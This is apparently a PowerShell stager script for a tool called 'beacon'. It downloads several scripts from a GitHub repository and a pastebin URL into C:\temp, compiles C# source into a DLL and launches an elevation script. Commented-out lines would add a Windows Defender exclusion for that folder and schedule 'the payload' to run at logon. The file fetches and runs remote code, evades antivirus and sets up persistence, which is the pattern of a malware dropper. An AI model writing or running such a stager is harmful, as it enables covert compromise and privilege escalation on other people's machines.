# Create the necessary directories
mkdir C:\temp
mkdir C:\temp\beacon
mkdir C:\temp\beacon\elevate

# # Excludes file paths
# Add-MpPreference -ExclusionPath "C:\temp" -ErrorAction Stop

Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/elevate/Source.cs > C:\temp\beacon\elevate\Source.cs
Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/elevate/compile.ps1 > C:\temp\beacon\elevate\compile.ps1
Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/elevate/Elevate.ps1 > C:\temp\beacon\elevate\Elevate.ps1
Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/elevate/elevinit.ps1 > C:\temp\beacon\elevate\elevinit.ps1
Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/run.ps1 > C:\temp\beacon\run.ps1
Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/newprocess.ps1 > C:\temp\beacon\newprocess.ps1
Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/GetState.ps1 > C:\temp\beacon\GetState.ps1
Invoke-Restmethod -Uri https://pastebin.com/raw/urK1nS7q > C:\temp\beacon\task.ps1
Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/TCPState.ps1 > C:\temp\beacon\TCPState.ps1
Invoke-Restmethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/elevate/haxmode.ps1 > C:\temp\beacon\elevate\haxmode.ps1

# Compile the C# source code into a DLL
C:\temp\beacon\elevate\compile.ps1

# # Create a scheduled task to run the payload at logon
# C:\temp\beacon\task.ps1

# Execute the elevated console
C:\temp\beacon\elevate\Elevate.ps1